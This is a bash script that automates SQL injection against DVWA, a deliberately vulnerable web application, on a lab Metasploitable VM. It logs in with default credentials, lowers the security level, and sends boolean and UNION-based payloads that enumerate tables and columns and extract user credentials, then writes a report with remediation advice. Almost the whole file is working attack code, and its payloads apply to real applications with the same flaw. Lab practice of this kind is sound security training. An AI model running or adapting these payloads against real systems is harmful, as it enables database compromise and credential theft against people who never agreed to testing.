#!/bin/bash

# SQL Injection Exploit Script for DVWA (Low Security)
# Author: NyxTheDark
# GitHub: https://github.com/NyxTheDark
# Date: $(date)
# Target: Metasploitable DVWA SQL Injection Vulnerability
# Attacker: Kali Linux
# Target IP: 192.168.29.215

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DVWA_URL="http://192.168.29.215/dvwa"
TARGET_URL="$DVWA_URL/vulnerabilities/sqli"
LOGIN_URL="$DVWA_URL/login.php"
COOKIE_FILE="dvwa_cookies.txt"

# Default credentials for DVWA
USERNAME="admin"
PASSWORD="password"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  DVWA SQL Injection Exploit - Kali Linux${NC}"
echo -e "${BLUE}  Target: Metasploitable (192.168.29.215)${NC}"
echo -e "${BLUE}  Author: NyxTheDark${NC}"
echo -e "${BLUE}========================================${NC}\n"

# Function to check if DVWA is accessible
check_dvwa_availability() {
    echo -e "${YELLOW}[INFO]${NC} Checking DVWA availability..."
    
    if curl -s --connect-timeout 5 "$DVWA_URL" > /dev/null; then
        echo -e "${GREEN}[SUCCESS]${NC} Metasploitable DVWA is accessible at $DVWA_URL"
        return 0
    else
        echo -e "${RED}[ERROR]${NC} Metasploitable DVWA is not accessible at $DVWA_URL"
        echo -e "${YELLOW}[INFO]${NC} Please ensure Metasploitable VM is running and network is configured"
        echo -e "${YELLOW}[INFO]${NC} Check if IP 192.168.29.215 is reachable from Kali Linux"
        return 1
    fi
}

# Function to login to DVWA
login_to_dvwa() {
    echo -e "\n${YELLOW}[INFO]${NC} Logging into DVWA..."
    
    # Get login page to extract user_token
    USER_TOKEN=$(curl -s -c "$COOKIE_FILE" "$LOGIN_URL" | grep -oP 'user_token.*?value="\K[^"]*')
    
    if [ -z "$USER_TOKEN" ]; then
        echo -e "${RED}[ERROR]${NC} Failed to extract user token"
        return 1
    fi
    
    # Perform login
    LOGIN_RESPONSE=$(curl -s -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
        -d "username=$USERNAME" \
        -d "password=$PASSWORD" \
        -d "Login=Login" \
        -d "user_token=$USER_TOKEN" \
        "$LOGIN_URL")
    
    # Check if login was successful
    if echo "$LOGIN_RESPONSE" | grep -q "Welcome to Damn Vulnerable Web Application"; then
        echo -e "${GREEN}[SUCCESS]${NC} Successfully logged into DVWA"
        return 0
    else
        echo -e "${RED}[ERROR]${NC} Failed to login to DVWA"
        return 1
    fi
}

# Function to set security level to low
set_security_low() {
    echo -e "\n${YELLOW}[INFO]${NC} Setting DVWA security level to low..."
    
    # Get security page to extract user_token
    SECURITY_URL="$DVWA_URL/security.php"
    USER_TOKEN=$(curl -s -b "$COOKIE_FILE" "$SECURITY_URL" | grep -oP 'user_token.*?value="\K[^"]*')
    
    # Set security to low
    curl -s -b "$COOKIE_FILE" \
        -d "security=low" \
        -d "seclev_submit=Submit" \
        -d "user_token=$USER_TOKEN" \
        "$SECURITY_URL" > /dev/null
    
    echo -e "${GREEN}[SUCCESS]${NC} Security level set to low"
}

# Function to perform basic SQL injection tests
perform_sql_injection() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}    Performing SQL Injection Tests${NC}"
    echo -e "${BLUE}========================================${NC}\n"
    
    # Array of SQL injection payloads
    declare -a payloads=(
        "1' OR '1'='1"
        "1' OR '1'='1' --"
        "1' OR '1'='1' #"
        "1' UNION SELECT null, null --"
        "1' UNION SELECT 1,2 --"
        "1' UNION SELECT user(),database() --"
        "1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database() --"
        "1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --"
        "1' UNION SELECT user,password FROM users --"
    )
    
    echo -e "${YELLOW}[INFO]${NC} Testing SQL injection payloads...\n"
    
    for i in "${!payloads[@]}"; do
        payload="${payloads[$i]}"
        echo -e "${BLUE}[TEST $((i+1))]${NC} Payload: ${YELLOW}$payload${NC}"
        
        # URL encode the payload
        encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/'\''/%27/g' | sed 's/=/%3D/g')
        
        # Send the request
        response=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/?id=$encoded_payload&Submit=Submit")
        
        # Check for successful injection indicators
        if echo "$response" | grep -q "Surname.*admin\|First name.*admin\|ID.*admin"; then
            echo -e "${GREEN}[SUCCESS]${NC} SQL injection successful!"
            echo -e "${GREEN}[RESULT]${NC} Retrieved user data"
        elif echo "$response" | grep -q "mysql_num_rows()"; then
            echo -e "${YELLOW}[PARTIAL]${NC} MySQL error detected - vulnerable but incomplete"
        elif echo "$response" | grep -q "You have an error in your SQL syntax"; then
            echo -e "${YELLOW}[VULNERABLE]${NC} SQL syntax error - application is vulnerable"
        else
            echo -e "${RED}[FAILED]${NC} No clear indication of vulnerability"
        fi
        
        # Save response for analysis
        echo "$response" > "response_test_$((i+1)).html"
        echo -e "${YELLOW}[INFO]${NC} Response saved to response_test_$((i+1)).html\n"
        
        # Add delay to avoid overwhelming the server
        sleep 1
    done
}

# Function to extract database information
extract_database_info() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}    Extracting Database Information${NC}"
    echo -e "${BLUE}========================================${NC}\n"
    
    # Get database version and user
    echo -e "${YELLOW}[INFO]${NC} Extracting database version and user..."
    payload="1' UNION SELECT version(),user() --"
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/'\''/%27/g' | sed 's/=/%3D/g')
    
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/?id=$encoded_payload&Submit=Submit")
    echo "$response" > "database_info.html"
    
    # Extract table names
    echo -e "${YELLOW}[INFO]${NC} Extracting table names..."
    payload="1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database() --"
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/'\''/%27/g' | sed 's/=/%3D/g')
    
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/?id=$encoded_payload&Submit=Submit")
    echo "$response" > "table_names.html"
    
    # Extract user table structure
    echo -e "${YELLOW}[INFO]${NC} Extracting user table structure..."
    payload="1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --"
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/'\''/%27/g' | sed 's/=/%3D/g')
    
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/?id=$encoded_payload&Submit=Submit")
    echo "$response" > "user_table_structure.html"
    
    # Extract user credentials
    echo -e "${YELLOW}[INFO]${NC} Extracting user credentials..."
    payload="1' UNION SELECT user,password FROM users --"
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/'\''/%27/g' | sed 's/=/%3D/g')
    
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET_URL/?id=$encoded_payload&Submit=Submit")
    echo "$response" > "user_credentials.html"
    
    echo -e "${GREEN}[SUCCESS]${NC} Database information extracted and saved to HTML files"
}

# Function to generate report
generate_report() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${BLUE}    Generating Exploitation Report${NC}"
    echo -e "${BLUE}========================================${NC}\n"
    
    cat > "sql_injection_report.txt" << EOF
SQL Injection Exploitation Report
=================================
Date: $(date)
Target: Metasploitable VM (192.168.29.215)
Attacker: Kali Linux
Application: DVWA (Damn Vulnerable Web Application)
Security Level: Low
Author: NyxTheDark
GitHub: https://github.com/NyxTheDark

ENVIRONMENT SETUP:
- Target System: Metasploitable 2 VM
- Target IP: 192.168.29.215
- Attacking System: Kali Linux
- Network Configuration: Host-only/NAT network
- Application: DVWA on Apache/MySQL

VULNERABILITY SUMMARY:
The DVWA application running on Metasploitable is vulnerable to SQL injection attacks 
in the SQL Injection module. The application does not properly sanitize user input, 
allowing attackers to manipulate SQL queries and extract sensitive information from 
the database running on the vulnerable system.

ATTACK VECTORS TESTED:
1. Basic boolean-based injection: 1' OR '1'='1
2. Comment-based injection: 1' OR '1'='1' --
3. UNION-based injection: 1' UNION SELECT 1,2 --
4. Information schema exploitation
5. User credential extraction

IMPACT:
- Complete database compromise on Metasploitable system
- User credential theft from vulnerable DVWA application
- Potential lateral movement within Metasploitable environment
- Data integrity compromise
- Information disclosure about target system

NETWORK PENETRATION TESTING CONTEXT:
This demonstration shows how SQL injection vulnerabilities can be exploited
in a controlled penetration testing scenario using Kali Linux against
a deliberately vulnerable Metasploitable target system.

RECOMMENDATIONS:
1. Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Apply principle of least privilege to database accounts
4. Enable SQL injection detection and prevention tools
5. Regular security testing and code reviews

FILES GENERATED:
- response_test_*.html: Individual test responses
- database_info.html: Database version and user information
- table_names.html: Database table enumeration
- user_table_structure.html: User table column information
- user_credentials.html: Extracted user credentials
EOF

    echo -e "${GREEN}[SUCCESS]${NC} Report generated: sql_injection_report.txt"
}

# Function to cleanup
cleanup() {
    echo -e "\n${YELLOW}[INFO]${NC} Cleaning up temporary files..."
    rm -f "$COOKIE_FILE"
    echo -e "${GREEN}[SUCCESS]${NC} Cleanup completed"
}

# Main execution flow
main() {
    echo -e "${YELLOW}[INFO]${NC} Starting SQL injection exploitation...\n"
    
    # Check if DVWA is available
    if ! check_dvwa_availability; then
        exit 1
    fi
    
    # Login to DVWA
    if ! login_to_dvwa; then
        exit 1
    fi
    
    # Set security level to low
    set_security_low
    
    # Perform SQL injection tests
    perform_sql_injection
    
    # Extract database information
    extract_database_info
    
    # Generate report
    generate_report
    
    # Cleanup
    cleanup
    
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${GREEN}    SQL Injection Exploitation Complete${NC}"
    echo -e "${GREEN}========================================${NC}\n"
    
    echo -e "${YELLOW}[INFO]${NC} Check the generated files for detailed results:"
    echo -e "  - sql_injection_report.txt (Summary report)"
    echo -e "  - *.html files (Detailed responses)"
    echo -e "\n${RED}[WARNING]${NC} This script is for educational purposes only."
    echo -e "${RED}[WARNING]${NC} Only use on systems you own or have explicit permission to test."
}

# Handle script interruption
trap cleanup EXIT

# Check if script is being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
